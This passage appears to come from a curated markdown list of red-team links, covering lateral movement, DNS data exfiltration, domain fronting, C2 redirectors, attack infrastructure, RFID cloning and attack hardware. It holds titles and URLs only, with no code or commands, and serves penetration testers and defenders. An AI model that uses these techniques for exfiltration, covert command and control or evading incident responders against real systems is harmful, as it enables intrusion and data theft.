* [Getting the goods with CrackMapExec: Part 2](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html)
* [DiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
* [Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement](https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/)
* [a guide to attacking domain trusts](https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944)
* [Outlook Home Page – Another Ruler Vector](https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/)
* [Outlook Forms and Shells](https://sensepost.com/blog/2017/outlook-forms-and-shells/)
* [Abusing the COM Registry Structure: CLSID, LocalServer32, & InprocServer32](https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/)
* [LethalHTA - A new lateral movement technique using DCOM and HTA](https://codewhitesec.blogspot.com/2018/07/lethalhta.html)
* [Abusing DCOM For Yet Another Lateral Movement Technique](https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/)
   
## [↑](#table-of-contents) Collection  
* [Accessing clipboard from the lock screen in Windows 10 Part 1](https://oddvar.moe/2017/01/24/accessing-clipboard-from-the-lock-screen-in-windows-10/)
* [Accessing clipboard from the lock screen in Windows 10 Part 2](https://oddvar.moe/2017/01/27/access-clipboard-from-lock-screen-in-windows-10-2/)

  
   
## [↑](#table-of-contents) Exfiltration
* [DNS Data exfiltration — What is this and How to use?](https://blog.fosec.vn/dns-data-exfiltration-what-is-this-and-how-to-use-2f6c69998822)
* [DNS Tunnelling](http://resources.infosecinstitute.com/dns-tunnelling/)
* [sg1: swiss army knife for data encryption, exfiltration & covert communication](https://securityonline.info/sg1-swiss-army-knife-for-data-encryption-exfiltration-covert-communication/?utm_source=ReviveOldPost&utm_medium=social&utm_campaign=ReviveOldPost)
* [Data Exfiltration over DNS Request Covert Channel: DNSExfiltrator](https://n0where.net/data-exfiltration-over-dns-request-covert-channel-dnsexfiltrator)
* [DET (extensible) Data Exfiltration Toolkit](https://github.com/PaulSec/DET)
* [Data Exfiltration via Formula Injection Part1](https://www.notsosecure.com/data-exfiltration-formula-injection/)


## [↑](#table-of-contents) Command and Control

### Domain Fronting
* [Empre Domain Fronting](https://www.xorrior.com/Empire-Domain-Fronting/)
* [Escape and Evasion Egressing Restricted Networks - Tom Steele and Chris Patten](https://www.optiv.com/blog/escape-and-evasion-egressing-restricted-networks)
* [Finding Frontable Domain](https://github.com/rvrsh3ll/FindFrontableDomains)
* [TOR Fronting – Utilising Hidden Services for Privacy](https://www.mdsec.co.uk/2017/02/tor-fronting-utilising-hidden-services-for-privacy/)
* [Simple domain fronting PoC with GAE C2 server](https://www.securityartwork.es/2017/01/31/simple-domain-fronting-poc-with-gae-c2-server/)
* [Domain Fronting Via Cloudfront Alternate Domains](https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/)
* [Finding Domain frontable Azure domains - thoth / Fionnbharr (@a_profligate)](https://theobsidiantower.com/2017/07/24/d0a7cfceedc42bdf3a36f2926bd52863ef28befc.html)
* [Google Groups: Blog post on finding 2000+ Azure domains using Censys](https://groups.google.com/forum/#!topic/traffic-obf/7ygIXCPebwQ)
* [Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike](https://www.cyberark.com/threat-research-blog/red-team-insights-https-domain-fronting-google-hosts-using-cobalt-strike/)
* [SSL Domain Fronting 101](http://www.rvrsh3ll.net/blog/offensive/ssl-domain-fronting-101/)
* [How I Identified 93k Domain-Frontable CloudFront Domains](https://www.peew.pw/blog/2018/2/22/how-i-identified-93k-domain-frontable-cloudfront-domains)
* [Validated CloudFront SSL Domains](https://medium.com/@vysec.private/validated-cloudfront-ssl-domains-27895822cea3)
* [CloudFront Hijacking](https://www.mindpointgroup.com/blog/pen-test/cloudfront-hijacking/)
* [CloudFrunt GitHub Repo](https://github.com/MindPointGroup/cloudfrunt)

### Connection Proxy
* [Redirecting Cobalt Strike DNS Beacons](http://www.rvrsh3ll.net/blog/offensive/redirecting-cobalt-strike-dns-beacons/)
* [Apache2Mod Rewrite Setup](https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup)
* [Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite](https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/)
* [High-reputation Redirectors and Domain Fronting](https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/)
* [Cloud-based Redirectors for Distributed Hacking](https://blog.cobaltstrike.com/2014/01/14/cloud-based-redirectors-for-distributed-hacking/)
* [Combatting Incident Responders with Apache mod_rewrite](https://bluescreenofjeff.com/2016-04-12-combatting-incident-responders-with-apache-mod_rewrite/)
* [Operating System Based Redirection with Apache mod_rewrite](https://bluescreenofjeff.com/2016-04-05-operating-system-based-redirection-with-apache-mod_rewrite/)
* [Invalid URI Redirection with Apache mod_rewrite](https://bluescreenofjeff.com/2016-03-29-invalid-uri-redirection-with-apache-mod_rewrite/)
* [Strengthen Your Phishing with Apache mod_rewrite and Mobile User Redirection](https://bluescreenofjeff.com/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/)
* [mod_rewrite rule to evade vendor sandboxes](https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10)
* [Expire Phishing Links with Apache RewriteMap](https://bluescreenofjeff.com/2016-04-19-expire-phishing-links-with-apache-rewritemap/)
* [Serving random payloads with NGINX](https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9)
* [Mod_Rewrite Automatic Setup](https://blog.inspired-sec.com/archive/2017/04/17/Mod-Rewrite-Automatic-Setup.html)
* [Hybrid Cobalt Strike Redirectors](https://zachgrace.com/2018/02/20/cobalt_strike_redirectors.html)
* [Expand Your Horizon Red Team – Modern SAAS C2](https://cybersyndicates.com/2017/04/expand-your-horizon-red-team/)
* [RTOps: Automating Redirector Deployment With Ansible](http://threat.tevora.com/automating-redirector-deployment-with-ansible/)

### Web Services
* [C2 with Dropbox](https://pentestlab.blog/2017/08/29/command-and-control-dropbox/)
* [C2 with gmail](https://pentestlab.blog/2017/08/03/command-and-control-gmail/)
* [C2 with twitter](https://pentestlab.blog/2017/09/26/command-and-control-twitter/)
* [Office 365 for Cobalt Strike C2](https://labs.mwrinfosecurity.com/blog/tasking-office-365-for-cobalt-strike-c2/)
* [Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike](https://www.cyberark.com/threat-research-blog/red-team-insights-https-domain-fronting-google-hosts-using-cobalt-strike/)
* [A stealthy Python based Windows backdoor that uses Github as a C&C server](http://securityblog.gr/4434/a-stealthy-python-based-windows-backdoor-that-uses-github-as-a-cc-server/)
* [External C2 (Third-Party Command and Control)](https://www.cobaltstrike.com/help-externalc2)
* [Cobalt Strike over external C2 – beacon home in the most obscure ways](https://outflank.nl/blog/2017/09/17/blogpost-cobalt-strike-over-external-c2-beacon-home-in-the-most-obscure-ways/)
* [External C2 for Cobalt Strike](https://github.com/ryhanson/ExternalC2/)
* [External C2 framework for Cobalt Strike](http://www.insomniacsecurity.com/2018/01/11/externalc2.html)
* [External C2 framework - GitHub Repo](https://github.com/Und3rf10w/external_c2_framework)
* [Hiding in the Cloud: Cobalt Strike Beacon C2 using Amazon APIs](https://github.com/Und3rf10w/external_c2_framework)
* [Exploring Cobalt Strike's ExternalC2 framework](https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/)

### Application Layer Protocol
* [C2 WebSocket](https://pentestlab.blog/2017/12/06/command-and-control-websocket/)
* [C2 WMI](https://pentestlab.blog/2017/11/20/command-and-control-wmi/)
* [C2 Website](https://pentestlab.blog/2017/11/14/command-and-control-website/)
* [C2 Image](https://pentestlab.blog/2018/01/02/command-and-control-images/)
* [C2 Javascript](https://pentestlab.blog/2018/01/08/command-and-control-javascript/)
* [C2 WebInterface](https://pentestlab.blog/2018/01/03/command-and-control-web-interface/)
* [C2 with DNS](https://pentestlab.blog/2017/09/06/command-and-control-dns/)
* [C2 with https](https://pentestlab.blog/2017/10/04/command-and-control-https/)
* [C2 with webdav](https://pentestlab.blog/2017/09/12/command-and-control-webdav/)
* [Introducing Merlin — A cross-platform post-exploitation HTTP/2 Command & Control Tool](https://medium.com/@Ne0nd0g/introducing-merlin-645da3c635a)
* [InternetExplorer.Application for C2](https://adapt-and-attack.com/2017/12/19/internetexplorer-application-for-c2/)

### Infrastructure
* [Automated Red Team Infrastructure Deployment with Terraform - Part 1](https://rastamouse.me/blog/terraform-pt1/)
* [Automated Red Team Infrastructure Deployment with Terraform - Part 2](https://rastamouse.me/blog/terraform-pt2/)
* [Red Team Infrastructure - AWS Encrypted EBS](https://rastamouse.me/blog/encrypted-ebs/)
* [6 RED TEAM INFRASTRUCTURE TIPS](https://cybersyndicates.com/2016/11/top-red-team-tips/)
* [How to Build a C2 Infrastructure with Digital Ocean – Part 1](https://www.blackhillsinfosec.com/build-c2-infrastructure-digital-ocean-part-1/)
* [Infrastructure for Ongoing Red Team Operations](https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/)
* [Attack Infrastructure Log Aggregation and Monitoring](https://posts.specterops.io/attack-infrastructure-log-aggregation-and-monitoring-345e4173044e)
* [Randomized Malleable C2 Profiles Made Easy](https://bluescreenofjeff.com/2017-08-30-randomized-malleable-c2-profiles-made-easy/)
* [Migrating Your infrastructure](https://blog.cobaltstrike.com/2015/10/21/migrating-your-infrastructure/)
* [ICMP C2](https://pentestlab.blog/2017/07/28/command-and-control-icmp/)
* [Using WebDAV features as a covert channel](https://arno0x0x.wordpress.com/2017/09/07/using-webdav-features-as-a-covert-channel/)
* [Safe Red Team Infrastructure](https://medium.com/@malcomvetter/safe-red-team-infrastructure-c5d6a0f13fac)
* [EGRESSING BLUECOAT WITH COBALTSTIKE & LET'S ENCRYPT](https://cybersyndicates.com/2016/12/egressing-bluecoat-with-cobaltstike-letsencrypt/)
* [Command and Control Using Active Directory](http://www.harmj0y.net/blog/powershell/command-and-control-using-active-directory/)
* [A Vision for Distributed Red Team Operations](https://blog.cobaltstrike.com/2013/02/12/a-vision-for-distributed-red-team-operations/)
* [Designing Effective Covert Red Team Attack Infrastructure](https://bluescreenofjeff.com/2017-12-05-designing-effective-covert-red-team-attack-infrastructure/)
* [Serving Random Payloads with Apache mod_rewrite](https://bluescreenofjeff.com/2017-06-13-serving-random-payloads-with-apache-mod_rewrite/)
* [Mail Servers Made Easy](https://blog.inspired-sec.com/archive/2017/02/14/Mail-Server-Setup.html)
* [Securing your Empire C2 with Apache mod_rewrite](https://thevivi.net/2017/11/03/securing-your-empire-c2-with-apache-mod_rewrite/)
* [Automating Gophish Releases With Ansible and Docker](https://jordan-wright.com/blog/post/2018-02-04-automating-gophish-releases/)
* [How to Write Malleable C2 Profiles for Cobalt Strike](https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/)
* [How to Make Communication Profiles for Empire](https://bluescreenofjeff.com/2017-03-01-how-to-make-communication-profiles-for-empire/)
* [A Brave New World: Malleable C2](http://www.harmj0y.net/blog/redteaming/a-brave-new-world-malleable-c2/)
* [Malleable Command and Control](https://www.cobaltstrike.com/help-malleable-c2)


## [↑](#table-of-contents) Embedded and Peripheral Devices Hacking
* [Gettting in with the Proxmark3 & ProxBrute](https://www.trustwave.com/Resources/SpiderLabs-Blog/Getting-in-with-the-Proxmark-3-and-ProxBrute/)
* [Practical Guide to RFID Badge copying](https://blog.nviso.be/2017/01/11/a-practical-guide-to-rfid-badge-copying/)
* [Contents of a Physical Pentester Backpack](https://www.tunnelsup.com/contents-of-a-physical-pen-testers-backpack/)
* [MagSpoof - credit card/magstripe spoofer](https://github.com/samyk/magspoof)
* [Wireless Keyboard Sniffer](https://samy.pl/keysweeper/)
* [RFID Hacking with The Proxmark 3](https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/)
* [Swiss Army Knife for RFID](https://www.cs.bham.ac.uk/~garciaf/publications/Tutorial_Proxmark_the_Swiss_Army_Knife_for_RFID_Security_Research-RFIDSec12.pdf)
* [Exploring NFC Attack Surface](https://media.blackhat.com/bh-us-12/Briefings/C_Miller/BH_US_12_Miller_NFC_attack_surface_WP.pdf)
* [Outsmarting smartcards](http://gerhard.dekoninggans.nl/documents/publications/dekoninggans.phd.thesis.pdf)
* [Reverse engineering HID iClass Master keys](https://blog.kchung.co/reverse-engineering-hid-iclass-master-keys/)
* [Android Open Pwn Project (AOPP)](https://www.pwnieexpress.com/aopp)


## [↑](#table-of-contents) Misc
* [Red Tips of Vysec](https://github.com/vysec/RedTips)
* [Cobalt Strike Tips for 2016 ccde red teams](https://blog.cobaltstrike.com/2016/02/23/cobalt-strike-tips-for-2016-ccdc-red-teams/)
* [Models for Red Team Operations](https://blog.cobaltstrike.com/2015/07/09/models-for-red-team-operations/)
* [Planning a Red Team exercise](https://github.com/magoo/redteam-plan)
* [Raphael Mudge - Dirty Red Team tricks](https://www.youtube.com/watch?v=oclbbqvawQg)
* [introducing the adversary resilience methodology part 1](https://posts.specterops.io/introducing-the-adversary-resilience-methodology-part-one-e38e06ffd604)
* [introducing the adversary resilience methodology part 2](https://posts.specterops.io/introducing-the-adversary-resilience-methodology-part-two-279a1ed7863d)
* [Responsible red team](https://medium.com/@malcomvetter/responsible-red-teams-1c6209fd43cc)
* [Red Teaming for Pacific Rim CCDC 2017](https://bluescreenofjeff.com/2017-05-02-red-teaming-for-pacific-rim-ccdc-2017/)
* [How I Prepared to Red Team at PRCCDC 2015](https://bluescreenofjeff.com/2015-04-15-how-i-prepared-to-red-team-at-prccdc-2015/)
* [Red Teaming for Pacific Rim CCDC 2016](https://bluescreenofjeff.com/2016-05-24-pacific-rim-ccdc_2016/)
* [Responsible Red Teams](https://medium.com/@malcomvetter/responsible-red-teams-1c6209fd43cc)
* [Awesome-CobaltStrike](https://github.com/zer0yu/Awesome-CobaltStrike)
* RedTeaming from Zero to One [Part-1](https://payatu.com/redteaming-from-zero-to-one-part-1) [Part-2](https://payatu.com/redteaming-zero-one-part-2)

## [↑](#table-of-contents) RedTeam Gadgets
#### Network Implants
* [LAN Tap Pro](https://hackerwarehouse.com/product/lan-tap-pro/)
* [LAN Turtle](https://hakshop.com/collections/network-implants/products/lan-turtle)
* [Bash Bunny](https://hakshop.com/collections/physical-access/products/bash-bunny)
* [Key Croc](https://shop.hak5.org/collections/sale/products/key-croc)
* [Packet Squirrel](https://hakshop.com/products/packet-squirrel)
* [Shark Jack](https://shop.hak5.org/collections/sale/products/shark-jack)
#### Wifi Auditing
* [WiFi Pineapple](https://hakshop.com/products/wifi-pineapple)
* [Alpha Long range Wireless USB](https://hackerwarehouse.com/product/alfa-802-11bgn-long-range-usb-wireless-adapter/)
* [Wifi-Deauth Monster](https://www.tindie.com/products/lspoplove/dstike-wifi-deauther-monster/)
* [Crazy PA](https://www.amazon.com/gp/product/B00VYA3A2U/ref=as_li_tl)
* [Signal Owl](https://shop.hak5.org/products/signal-owl)
#### IoT
* [BLE Key](https://hackerwarehouse.com/product/blekey/)
* [Proxmark3](https://hackerwarehouse.com/product/proxmark3-kit/)
* [Zigbee Sniffer](https://www.attify-store.com/products/zigbee-sniffing-tool-atmel-rzraven)
* [Attify IoT Exploit kit](https://www.attify-store.com/collections/frontpage/products/jtag-exploitation-kit-with-lab-manual)
#### Software Defined Radio - SDR
* [HackRF One Bundle](https://hackerwarehouse.com/product/hackrf-one-kit/)
* [RTL-SDR](https://hackerwarehouse.com/product/rtlsdr/)
* [YARD stick one Bundle](https://hackerwarehouse.com/product/yard-stick-one-kit/)
* [Ubertooth](https://hackerwarehouse.com/product/ubertooth-one/)
#### Misc
* [Key Grabber](https://hackerwarehouse.com/product/keygrabber/)
* [Magspoof](https://store.ryscc.com/products/magspoof%20)
* [Poison tap](https://samy.pl/poisontap/)
* [keysweeper](https://samy.pl/keysweeper/)
* [USB Rubber Ducky](https://hakshop.com/collections/physical-access/products/usb-rubber-ducky-deluxe)
* [Screen Crab](https://shop.hak5.org/collections/sale/products/screen-crab)
* [O.MG Cable](https://shop.hak5.org/collections/featured-makers/products/o-mg-cable)
* [Keysy](https://shop.hak5.org/collections/featured-makers/products/keysy)
* [Dorothy for Okta SSO](https://github.com/elastic/dorothy)

